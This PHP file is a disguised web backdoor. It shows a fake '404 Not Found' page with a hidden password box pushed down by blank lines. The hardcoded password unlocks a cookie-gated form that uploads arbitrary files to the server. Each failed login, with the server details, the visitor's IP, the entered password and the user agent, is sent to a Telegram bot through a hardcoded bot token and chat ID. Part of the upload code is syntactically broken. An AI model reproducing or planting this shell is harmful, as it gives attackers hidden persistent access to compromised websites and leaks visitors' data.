<?php

session_start(); 
error_reporting(0); 
set_time_limit(0);

$isLoggedIn = false;


if (isset($_COOKIE['anonshrivastav'])) {
   
  $isLoggedIn= $_COOKIE['anonshrivastav'];
    
}


function sendEmail($msg) {

  $botToken = '6597701693:AAHfW3zZQI2e95j-ePi_sL0vhRgQXqFWcDo'; //  BOT TOKEN
  $chatId = 5541591040; // YOUR TELEGRAM ACCOUNT ID GET FROM MY GF @MissRose_bot
  $message = $msg;

  $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

  $data = [
      'chat_id' => $chatId,
      'text' => $message,
    'parse_mode' => 'HTML',
  ];

  $options = [
      'http' => [
          'method'  => 'POST',
          'header'  => 'Content-type: application/x-www-form-urlencoded',
          'content' => http_build_query($data),
      ],
  ];

  $context  = stream_context_create($options);
  $result = file_get_contents($apiUrl, false, $context);
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["pass"])) {

  $validPassword = "invincibleisyourfather"; // ENTER VALID PASSWORD HERE
  $enteredPassword = $_POST["pass"];

    // Check if the password is incorrect (replace 'correct_password' with the actual correct password)
    if ($enteredPassword != $validPassword) {

      //SERVER INFO
        $serverPort = $_SERVER["SERVER_PORT"];
        $requestTime = date('m/d/Y H:i:s', $_SERVER["REQUEST_TIME"]);
        $scriptFileName = $_SERVER["SCRIPT_FILENAME"];
        $requestURI = $_SERVER['REQUEST_URI'];
        $serverName = $_SERVER["HTTP_HOST"];

      //USER INFO
        $userIP = $_SERVER["REMOTE_ADDR"];
        $userDevice = $_SERVER["HTTP_USER_AGENT"];


      $msg = 
"<b>Found a login attempt on server:</b> $serverName

<b>Server Info:</b>
<b>Server Name:</b> $serverName
<b>Server Port:</b> $serverPort
<b>Request Time:</b> $requestTime
<b>Complete URL:</b> $scriptFileName
<b>Base URL:</b> $requestURI

<b>User Info:</b>
<b>User IP:</b> $userIP
<b>Password:</b> $enteredPassword
<b>User Device:</b> $userDevice";

      sendEmail($msg);

    } else {
      setcookie("anonshrivastav","true", time() + 3600, "/"); 
    }
}

  $xSoftware = trim(getenv("SERVER_SOFTWARE"));
  $xServerName = $_SERVER["HTTP_HOST"];

//============ ANONSHRIVASTAV CODE ENDS ============


if($isLoggedIn == false){

  echo "
  <html>
  <head>
  <title>404 Not Found</title>
  <style type=\"text/css\">
  input{
  margin:0;
  background-color:#fff;
  border: 1px solid #fff;
  }
  </style>
  </head>

  <body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle your fucking request.</p>
  <hr>
  <address>" . $xSoftware . " Server at " . $xServerName . " Port 80 </address>
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <br />
  <center>
  <form method=\"post\">
  <input type=\"password\" name=\"pass\">
  </form>
  </center>
  </body>
  </html>";
  
}



else {
        
echo <!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "uploads/";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>
?>
